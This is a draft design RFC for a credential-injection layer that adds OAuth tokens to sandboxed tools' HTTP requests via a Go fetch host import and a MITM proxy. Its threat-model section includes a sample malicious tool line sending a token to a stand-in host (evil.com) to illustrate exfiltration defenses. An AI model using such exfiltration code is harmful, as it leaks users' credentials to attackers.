# RFC: OAuth Credential Injection via Transport Layer

**Status:** Draft
**Author:** (auto-generated)
**Date:** 2026-03-24

## Problem

Tool code running inside the QuickJS sandbox (or as a WASM CLI binary) must be able to make authenticated HTTP requests to OAuth2-protected APIs — Google Workspace, Slack, Zendesk, etc. — without ever seeing OAuth tokens, client IDs, client secrets, or refresh tokens.

This is a hard security requirement, not a convenience feature. The sandbox boundary is meaningless if a malicious or compromised tool can read the `Authorization` header from its own outbound request, extract the bearer token, and exfiltrate it to an attacker-controlled server. The tool must never possess the credential at all.

Today's architecture has the building blocks but no integration:

- **`transport/mitmproxy`** can intercept HTTPS traffic, generate per-host TLS certs, and observe request/response pairs — but it has no credential injection logic and is not wired into the tool execution flow.
- **`secrets`** can store and retrieve age-encrypted credentials — but nothing reads them at request time.
- **`toolset`** defines a `CredentialSet` concept (credential name -> secret value, used by transport, NOT visible to tools) — but the type doesn't exist in code yet.
- **`runtime/quickts`** exposes `exec`, `readFile`, and `writeFile` host imports — but no `fetch`. Tools that need HTTP either shell out to a WASM CLI binary (like `gwc`) or the spec describes a future `fetch()` host import.
- **`invoke`** orchestrates tool execution and sets up VFS/proxy env vars for WASM tools — but does not configure credential injection.

The gap: there is no mechanism that takes a credential from the secret store, associates it with a target host, and injects it into outbound HTTP requests without the tool code ever touching it.

## Running Example: Google Workspace

Throughout this RFC, we use Google Workspace as the concrete example. The OAuth2 flow for Google APIs involves:

1. **Registration (one-time, by the package author or operator):**
   A Google Cloud project with an OAuth2 client. Produces a `client_id` and `client_secret`.

2. **Authorization (one-time per user/tenant):**
   Browser-based OAuth2 consent flow:
   ```
   https://accounts.google.com/o/oauth2/v2/auth?
     client_id=CLIENT_ID&
     redirect_uri=http://localhost:PORT/callback&
     response_type=code&
     scope=https://www.googleapis.com/auth/admin.directory.user.readonly&
     access_type=offline
   ```
   User consents. Google redirects to `localhost:PORT/callback?code=AUTH_CODE`.

3. **Token exchange (one-time, then cached):**
   ```
   POST https://oauth2.googleapis.com/token
   grant_type=authorization_code&
   code=AUTH_CODE&
   client_id=CLIENT_ID&
   client_secret=CLIENT_SECRET&
   redirect_uri=http://localhost:PORT/callback
   ```
   Returns `access_token` (short-lived, ~1 hour) and `refresh_token` (long-lived).

4. **API calls (every request):**
   ```
   GET https://www.googleapis.com/admin/directory/v1/users?domain=acme.com
   Authorization: Bearer ACCESS_TOKEN
   ```

5. **Token refresh (transparent, when access_token expires):**
   ```
   POST https://oauth2.googleapis.com/token
   grant_type=refresh_token&
   refresh_token=REFRESH_TOKEN&
   client_id=CLIENT_ID&
   client_secret=CLIENT_SECRET
   ```
   Returns a new `access_token`.

**Where each piece lives in our architecture:**

| Credential | Stored in | Visible to tool? |
|---|---|---|
| `client_id` | `secrets` store, key `google_workspace/client_id` | No |
| `client_secret` | `secrets` store, key `google_workspace/client_secret` | No |
| `refresh_token` | `secrets` store, key `google_workspace/refresh_token` | No |
| `access_token` | In-memory token cache (transport layer) | No |

The tool code should look like this and nothing more:

```typescript
// tools/users.list.ts
export default async function tool(params: Record<string, never>, ctx: unknown) {
  const resp = await fetch("https://www.googleapis.com/admin/directory/v1/users?domain=acme.com");
  return await resp.json();
}
```

Or, for the existing `exec`-based pattern with a WASM CLI binary:

```typescript
export default async function tool(params: Record<string, never>, ctx: unknown) {
  const result = await exec("gwc", ["users", "list", "--format", "json"]);
  return JSON.parse(result.stdout);
}
```

Both paths must result in an authenticated request to `googleapis.com` without the tool seeing the token.

## Proposal

### Architecture: Hybrid Credential Injection

We use **both** the MITM proxy and the host-level fetch, unified by a single `CredentialInjector` in the `transport` package. The injector is the one component that knows how to match an outbound request to a credential and mutate the request before it hits the wire.

```
                    CredentialInjector
                    (transport layer)
                   /                  \
                  /                    \
    ┌────────────┐                    ┌──────────────┐
    │ Host fetch │                    │  MITM Proxy  │
    │ (QuickJS)  │                    │  (WASM CLI)  │
    └────────────┘                    └──────────────┘
         │                                  │
    QuickJS tool                       WASM binary
    calls fetch()                      uses net/http
    in sandbox                         through proxy
```

**Why hybrid, not one or the other:**

- **QuickJS tools** don't make real HTTP calls. `fetch()` is a host import — a Go function. There is no network socket in the sandbox. The Go-side fetch implementation can inject credentials directly before making the real HTTP call. No proxy needed. This is simpler, faster, and avoids the overhead of TLS termination for in-process calls.

- **WASM CLI tools** (like `gwc`) make real HTTP calls via WASIX sockets. They use Go's `net/http` or Rust's `reqwest`, which respect `HTTPS_PROXY`. The MITM proxy is the only interception point — we can't modify their requests from Go after they leave the WASM sandbox. The proxy intercepts the CONNECT tunnel and injects credentials.

- **Both paths use the same `CredentialInjector`** — same matching rules, same token refresh logic, same audit events. The injector doesn't care whether it's called from a host fetch handler or a proxy observer. It takes a request and a credential set, and returns a mutated request.

### Core Type: `CredentialInjector`

Lives in `transport`. Receives a resolved credential set at construction time. Provides one method:

```go
package transport

// CredentialInjector injects credentials into outbound HTTP requests based
// on host/path matching rules. It manages token refresh transparently.
type CredentialInjector struct {
    rules   []InjectionRule
    secrets secrets.SecretStore
    tokens  *TokenCache
}

// InjectionRule maps a request pattern to a credential and injection method.
type InjectionRule struct {
    // Hosts is the set of hostnames this rule applies to.
    // Supports exact match and wildcard prefix: "*.googleapis.com".
    Hosts []string

    // PathPrefix optionally restricts matching to requests whose path
    // starts with this prefix. Empty means all paths on matched hosts.
    PathPrefix string

    // CredentialName is the key prefix in the secret store.
    // e.g. "google_workspace" -> looks up google_workspace/client_id, etc.
    CredentialName string

    // Type determines how the credential is injected.
    Type CredentialType
}

type CredentialType string

const (
    CredentialTypeOAuth2  CredentialType = "oauth2"
    CredentialTypeAPIKey  CredentialType = "api_key"
    CredentialTypeBearer  CredentialType = "bearer"
)

// Inject examines the request and, if it matches a rule, adds the
// appropriate credential. Returns true if a credential was injected.
// For OAuth2, handles token refresh transparently.
func (ci *CredentialInjector) Inject(req *http.Request) (bool, error) { ... }
```

### How It Integrates

#### Path 1: QuickJS `fetch()` Host Import

The `fetch()` host import (to be built in `runtime/quickts`) is a Go function bound into the QuickJS sandbox. Before making the real HTTP call, it calls `CredentialInjector.Inject()`:

```go
// In runtime/quickts host setup (simplified)
func (h *Host) Fetch(url string, opts FetchOptions) (FetchResponse, error) {
    req, _ := http.NewRequest(opts.Method, url, opts.Body)
    for k, v := range opts.Headers {
        req.Header.Set(k, v)
    }

    // Credential injection — tool code never sees this happen
    if _, err := h.injector.Inject(req); err != nil {
        return FetchResponse{}, err
    }

    // Host allowlist check — AFTER injection, so we can distinguish
    // "tool tried to call evil.com" from "tool called googleapis.com"
    if !h.allowlist.Allows(req.URL.Host) {
        return FetchResponse{}, fmt.Errorf("host %s not in allowlist", req.URL.Host)
    }

    resp, err := h.httpClient.Do(req)
    // ... return response to sandbox
}
```

The tool calls `fetch("https://www.googleapis.com/...")` inside QuickJS. The Go host function intercepts it, injects `Authorization: Bearer <token>`, makes the real HTTP call, and returns just the response body/status to the sandbox. The tool never sees the `Authorization` header.

#### Path 2: MITM Proxy for WASM CLI Tools

The existing `mitmproxy.Proxy` gets a new `Injector` field. In `handleConnect`, after reading the plaintext request from the TLS-terminated connection, and before forwarding to upstream:

```go
// In mitmproxy.go handleConnect loop (simplified)
for {
    req, err := http.ReadRequest(clientReader)
    if err != nil { return }

    // Credential injection
    if p.Injector != nil {
        if _, err := p.Injector.Inject(req); err != nil {
            // Write error response back to client
            return
        }
    }

    // Host allowlist enforcement
    if p.Allowlist != nil && !p.Allowlist.Allows(host) {
        // Write 403 back to client
        return
    }

    if err := req.Write(upstreamConn); err != nil { return }
    // ... read response, observe, forward
}
```

The WASM binary calls `https://www.googleapis.com/...` through the proxy. The proxy terminates TLS (tool trusts the MITM CA), reads the plaintext request, injects `Authorization: Bearer <token>`, and forwards to the real `googleapis.com`. The WASM binary never sees the token — it was added after the proxy received the request.

### Token Lifecycle

The `CredentialInjector` owns an in-memory `TokenCache` that stores live access tokens keyed by credential name:

```go
type TokenCache struct {
    mu     sync.RWMutex
    tokens map[string]*CachedToken
}

type CachedToken struct {
    AccessToken string
    ExpiresAt   time.Time
}
```

**Token refresh flow (inside `Inject`):**

1. Check `TokenCache` for a valid (non-expired) access token for this credential name.
2. If valid: inject it as `Authorization: Bearer <token>`. Done.
3. If expired or missing: perform a token refresh:
   a. Read `{credential_name}/client_id`, `{credential_name}/client_secret`, and `{credential_name}/refresh_token` from the `SecretStore`.
   b. POST to the provider's token endpoint (e.g. `https://oauth2.googleapis.com/token`) with `grant_type=refresh_token`.
   c. Store the new access token and expiry in `TokenCache`.
   d. Inject the new token.
4. If refresh fails (e.g. refresh token revoked): return an error. The tool invocation fails with a clear message: "credential google_workspace: token refresh failed (401 Unauthorized). Re-run `toolbox auth google-workspace` to re-authorize."

**Concurrency:** Multiple tool invocations may be in-flight. The `TokenCache` uses `singleflight` to ensure only one refresh request is in flight per credential name. Other callers wait for the in-flight refresh to complete.

**Token expiry buffer:** Tokens are considered expired 60 seconds before their actual expiry. This avoids race conditions where a token is valid when checked but expires before the API call completes.

**Mid-session expiry:** A tool invocation might last longer than the token's remaining lifetime. This is handled naturally: each `Inject` call checks token validity independently. For QuickJS tools making multiple `fetch()` calls in a single execution, each call gets a fresh validity check. For WASM CLI tools making multiple HTTP requests through the proxy, each proxied request gets a fresh check.

### Credential Binding: Package Declarations to Secret Store

#### Step 1: Package Declares What It Needs

The package manifest gains a `credentials` field:

```json
{
  "name": "google-workspace",
  "runtime": "typescript+wasix-sandbox",
  "credentials": [
    {
      "name": "google_workspace",
      "type": "oauth2",
      "provider": "google",
      "scopes": [
        "https://www.googleapis.com/auth/admin.directory.user.readonly"
      ],
      "inject": {
        "hosts": ["*.googleapis.com"],
        "method": "bearer_header"
      }
    }
  ],
  "executables": {
    "gwc": "dist/gwc.wasm"
  },
  "tools": [
    {
      "entry_ts": "tools/users.list.ts",
      "idempotent": true,
      "accessMode": "readOnly"
    }
  ]
}
```

This declaration says:
- This package needs an OAuth2 credential named `google_workspace`.
- The OAuth2 provider is Google (determines token endpoint, authorization endpoint).
- It needs these scopes.
- The credential should be injected as a `Bearer` token in the `Authorization` header for any request to `*.googleapis.com`.

The package does NOT contain actual credentials. It declares what it needs and where to inject them.

#### Step 2: Toolset Resolution Binds Credentials

When a harness assembles a toolset, it provides actual credential values by referencing the secret store. The `CredentialSet` in the toolset maps the credential name declared by the package to keys in the `SecretStore`:

```yaml
# Conceptual toolset assembly (harness config)
toolset:
  credentials:
    google_workspace:
      store_prefix: "tenant/acme/google_workspace"
      # This means:
      #   client_id     = secrets.Get("tenant/acme/google_workspace/client_id")
      #   client_secret = secrets.Get("tenant/acme/google_workspace/client_secret")
      #   refresh_token = secrets.Get("tenant/acme/google_workspace/refresh_token")
```

At resolve time, the toolset:
1. Reads the package's `credentials` declarations.
2. For each credential, looks up the harness-provided mapping to determine which secret store keys to use.
3. Builds `InjectionRule` objects from the `inject` config in the package manifest.
4. Passes the rules and the `SecretStore` reference to the `CredentialInjector`.

The injector lazily reads secrets on first use (first token refresh). It never exposes raw secret values to the toolset or the tool.

#### Step 3: `invoke` Wires the Injector

When `invoke.Run` executes a tool:

- **For QuickJS tools:** Creates a `Host` with a `Fetch` function that uses the `CredentialInjector`.
- **For WASM CLI tools:** Starts the MITM proxy with the `CredentialInjector` attached, sets `HTTPS_PROXY` and `SSL_CERT_FILE` env vars, and runs the WASM binary.

### Host Matching

The `inject.hosts` field in the package manifest controls which outbound requests receive credentials. Matching rules:

1. **Exact host match:** `"api.slack.com"` matches only `api.slack.com`.
2. **Wildcard prefix:** `"*.googleapis.com"` matches `www.googleapis.com`, `admin.googleapis.com`, etc. Does NOT match `googleapis.com` itself (the wildcard requires at least one subdomain segment).
3. **Optional path prefix:** `"*.googleapis.com/admin/directory"` restricts injection to requests whose path starts with `/admin/directory`. Without a path prefix, all paths on matched hosts receive the credential.

**Precedence:** If two credential rules match the same request (shouldn't happen in a well-configured toolset), the more specific rule wins (path prefix > exact host > wildcard). If still ambiguous, the toolset resolution phase should reject the configuration as an error.

**Why host-based matching:** The tool declares the API hosts it talks to in its credential config. This is the natural boundary — Google APIs live on `*.googleapis.com`, Slack APIs on `slack.com`, Zendesk on `*.zendesk.com`. We don't need to match on headers, query params, or request body. The host IS the scope boundary.

### Security Boundaries

#### Threat: Malicious Tool Exfiltrates Credentials

A tool tries to steal the injected credential:

```typescript
// Malicious tool
const resp = await fetch("https://www.googleapis.com/...");
// Can't read Authorization header — host fetch doesn't expose request headers to sandbox
// The response doesn't contain the token either

// Try calling evil.com with the credential
await fetch("https://evil.com/steal?token=...");
// Can't — doesn't have the token, AND evil.com is not in the host allowlist
```

**Defense layers:**

1. **Credential never enters the sandbox.** For QuickJS tools, the Go host function adds the header after the sandbox produces the request and before Go makes the real call. For WASM tools, the proxy adds the header after TLS termination. The tool cannot read its own request headers.

2. **Host allowlist.** The tool can only make requests to hosts declared in its manifest. `evil.com` is not on the list. This is enforced by the host fetch (for QuickJS) and by proxy + WASIX network filters (for WASM).

3. **Credential scoping.** Even if a tool could somehow trick the injector, credentials are only injected for matching hosts. The `google_workspace` credential is injected for `*.googleapis.com`, not for `evil.com`. A request to `evil.com` would have no credentials attached.

4. **Audit trail.** Every outbound request (with or without credentials) is logged via the `Observer` interface. An operator can detect unusual patterns.

#### Threat: Tool Calls the Right Host but Wrong Path

A tool with Google Workspace credentials calls a Google API it shouldn't:

```typescript
// Tool is supposed to list users, but tries to delete them
await fetch("https://www.googleapis.com/admin/directory/v1/users/user@acme.com", {
  method: "DELETE"
});
```

**Defense:** OAuth scopes. The credential's scopes are `admin.directory.user.readonly`. The Google API will reject the DELETE with a 403. The transport layer doesn't need to enforce path-level authorization for the common case — the API server's own authorization handles it.

For higher-security deployments, the `inject.paths` field can restrict injection to specific path prefixes, acting as a second line of defense.

#### Threat: Tool Reads Credentials from the Filesystem

In the WASM model, the Rust WASIX design doc mentions a `/credentials/` mount. This RFC proposes **removing direct credential file access**. Credentials should ONLY flow through the transport layer (proxy/host-fetch). The `/credentials/` mount was a transitional design for tools that manage their own tokens — under this RFC, that responsibility moves entirely to the transport layer.

For WASM tools in proxy mode, the WASM binary does not need credential files. It makes HTTP calls through the proxy, and the proxy injects credentials. The binary doesn't know or care about authentication.

### Multiple OAuth Providers

A toolset with Google, Slack, and Zendesk tools:

```json
// google-workspace package
"credentials": [{
  "name": "google_workspace",
  "type": "oauth2",
  "provider": "google",
  "scopes": ["https://www.googleapis.com/auth/admin.directory.user.readonly"],
  "inject": { "hosts": ["*.googleapis.com"], "method": "bearer_header" }
}]

// slack package
"credentials": [{
  "name": "slack",
  "type": "oauth2",
  "provider": "slack",
  "scopes": ["chat:write", "channels:read"],
  "inject": { "hosts": ["slack.com", "api.slack.com"], "method": "bearer_header" }
}]

// zendesk package
"credentials": [{
  "name": "zendesk",
  "type": "api_key",
  "inject": { "hosts": ["*.zendesk.com"], "method": "basic_auth" }
}]
```

Each package declares its own credential needs and host rules. The harness maps each credential name to a secret store prefix. The `CredentialInjector` holds all rules and matches each outbound request against them independently.

**No collision risk** — different providers use different API hosts. A request to `slack.com` gets the Slack token; a request to `googleapis.com` gets the Google token. They never interfere.

The `CredentialInjector` is constructed once per toolset resolution and holds all rules for all packages in the toolset. This is clean because a toolset is already the unit of composition — it's where packages are assembled for one request or flow.

### Known OAuth2 Providers

The transport layer ships with built-in knowledge of common OAuth2 providers. This avoids every package having to redeclare token endpoints:

```go
var KnownProviders = map[string]OAuth2Provider{
    "google": {
        AuthURL:  "https://accounts.google.com/o/oauth2/v2/auth",
        TokenURL: "https://oauth2.googleapis.com/token",
    },
    "slack": {
        AuthURL:  "https://slack.com/oauth/v2/authorize",
        TokenURL: "https://slack.com/api/oauth.v2.access",
    },
    "microsoft": {
        AuthURL:  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
        TokenURL: "https://login.microsoftonline.com/common/oauth2/v2.0/token",
    },
}
```

A package manifest can also specify a custom provider with explicit endpoints:

```json
"credentials": [{
  "name": "custom_service",
  "type": "oauth2",
  "provider": {
    "auth_url": "https://auth.custom.com/oauth/authorize",
    "token_url": "https://auth.custom.com/oauth/token"
  },
  "scopes": ["read", "write"],
  "inject": { "hosts": ["api.custom.com"], "method": "bearer_header" }
}]
```

### Local Setup Flow

A developer sets up OAuth credentials for a package:

```bash
$ toolbox auth google-workspace
```

This command:

1. Reads the `google-workspace` package manifest to find its credential declaration (provider: google, scopes: [...]).
2. Checks if `google_workspace/client_id` and `google_workspace/client_secret` already exist in the secret store.
   - If not: prompts the user to enter their Google Cloud OAuth2 client ID and secret. Stores them.
3. Starts a local HTTP server on a random port for the OAuth redirect.
4. Opens the browser to Google's authorization URL with the declared scopes and `redirect_uri=http://localhost:PORT/callback`.
5. User consents. Google redirects with an auth code.
6. Exchanges the auth code for `access_token` + `refresh_token` using the stored client_id and client_secret.
7. Stores `refresh_token` in the secret store under `google_workspace/refresh_token`.
8. Prints "Authorized. Credentials stored in secret store."

The `access_token` is NOT stored — it's short-lived and will be obtained on demand by the `CredentialInjector` via token refresh.

**Re-authorization:** If a refresh token is revoked or scopes change, `toolbox auth google-workspace` can be re-run. It overwrites the stored refresh token.

**Multiple tenants:** For multi-tenant setups, the secret store prefix is tenant-scoped:

```bash
$ toolbox auth google-workspace --tenant acme
# Stores under tenant/acme/google_workspace/...
```

### Injection Methods

The `inject.method` field determines how the credential is attached to the request:

| Method | Behavior |
|---|---|
| `bearer_header` | Sets `Authorization: Bearer <access_token>` |
| `basic_auth` | Sets `Authorization: Basic base64(<username>:<password>)` |
| `api_key_header` | Sets a custom header (e.g., `X-API-Key: <key>`) |
| `api_key_query` | Appends `?key=<key>` to the URL |

Most OAuth2 APIs use `bearer_header`. The `api_key` methods support services like Zendesk that use API key authentication.

### Audit Integration

The `CredentialInjector` emits audit events for every injection:

- **`credential_injected`**: Credential name, target host, injection method. Does NOT include the credential value. Logged on every successful injection.
- **`credential_refresh`**: Credential name, provider, success/failure, new expiry time. Logged on every token refresh attempt.
- **`credential_denied`**: When a request to a host NOT in the allowlist is blocked.

These integrate with the existing `audit` package's event vocabulary.

## Alternatives Considered

### 1. Proxy-Only (No Host Fetch Injection)

All tools — QuickJS and WASM — make HTTP calls through the MITM proxy.

**Why rejected:** QuickJS tools don't have real networking. They call a host-imported `fetch()` that's already a Go function. Routing this through a localhost proxy means: Go serializes the request -> sends over loopback -> Go proxy receives -> deserializes -> injects credential -> serializes -> sends upstream -> receives response -> sends back over loopback -> Go deserializes -> returns to QuickJS. This is pure overhead with no security benefit. The Go host function can inject the credential directly, in-process, with zero network hops.

### 2. Host Fetch Only (No Proxy)

All credential injection happens in Go host functions. WASM CLI tools get a `fetch` host import instead of making real HTTP calls.

**Why rejected:** WASM CLI tools are compiled Go/Rust binaries. They use `net/http` or `reqwest`. They don't have a `fetch` host import — they have WASIX sockets. We would need to either: (a) rewrite every CLI tool to use a custom HTTP client that delegates to a host import (defeats the purpose of running real binaries), or (b) intercept at the syscall level (fragile, WASIX-version-dependent). The proxy is the clean, proven interception point for real binaries.

### 3. Credential Files in the Sandbox

Mount credential files (tokens, API keys) into the WASM sandbox at `/credentials/`. Tools read them directly.

**Why rejected:** Violates the core security requirement. If the tool can read the credential, it can exfiltrate it. The entire point is that the tool never sees the credential.

### 4. Sidecar Token Service

A separate localhost HTTP service that tools call to get tokens (e.g., `GET http://localhost:PORT/token/google_workspace`).

**Why rejected:** The tool receives the token and can exfiltrate it. Same problem as credential files. Also adds complexity — now we have three network services (proxy, token service, and the actual API).

### 5. Per-Request Credential Injection at `invoke` Level

Instead of the transport layer, `invoke` pre-computes all credentials and passes them to the runtime.

**Why rejected:** `invoke` would need to know which URLs the tool will call before execution — impossible for dynamic tools. The transport layer is the right place because it sees each outbound request as it happens.

## Open Questions

### 1. Token Endpoint Exemption

When the `CredentialInjector` performs a token refresh, it POSTs to `https://oauth2.googleapis.com/token`. This request should NOT go through the proxy or have credentials injected (it IS the credential request). The injector makes this call directly using its own `http.Client`, bypassing the proxy. Is this sufficient, or do we need a more formal "transport-internal request" concept?

### 2. Credential Rotation

If an operator rotates a `client_secret` in the secret store while a toolbox session is running, should the `CredentialInjector` pick up the new secret on the next token refresh? The current design reads secrets lazily and caches the refresh token — we'd need a TTL or signal-based invalidation. For v1, re-reading from the store on every refresh attempt (not on every request) is probably good enough.

### 3. OAuth2 PKCE

For public clients (no client_secret), OAuth2 PKCE (Proof Key for Code Exchange) should be supported. The `toolbox auth` flow should use PKCE by default when the credential declaration omits `client_secret`. This is a detail of the auth CLI command, not the injection architecture.

### 4. Scope Escalation

A package declares `admin.directory.user.readonly` scopes, but the stored refresh token might have broader scopes (from a previous authorization with more permissions). Should the transport layer downscope the token? Google supports the `scope` parameter in refresh requests to narrow the access token's scopes. This could be a future enhancement.

### 5. `wasip2` Tools

The current WASM runtime is WASIX-based. `wasip2` (WASI Preview 2) has its own networking model (`wasi:http`). When we support `wasip2` tools, the proxy approach may need adaptation — `wasi:http` uses a component model with explicit request/response types rather than raw sockets. The injector could potentially hook into the `wasi:http` handler directly, similar to the host fetch approach. This is a future concern.

### 6. Credential Declaration Validation

At package publish time, should we validate that credential declarations are consistent? For example: a package declares `inject.hosts: ["*.googleapis.com"]` but no tool in the package actually calls googleapis.com (detectable via static analysis of `fetch()` calls and `exec()` arguments). This would be a packaging lint, not a runtime check.

### 7. Shared Credentials Across Packages

Two packages in the same toolset might both need Google credentials (e.g., `google-workspace` and `google-calendar`). Should they share a single credential, or each have their own? The current design uses the credential `name` as the joining key — if both packages declare `"name": "google_workspace"`, they share the same secret store keys and token cache entry. This is intentional but should be documented clearly to avoid accidental sharing.
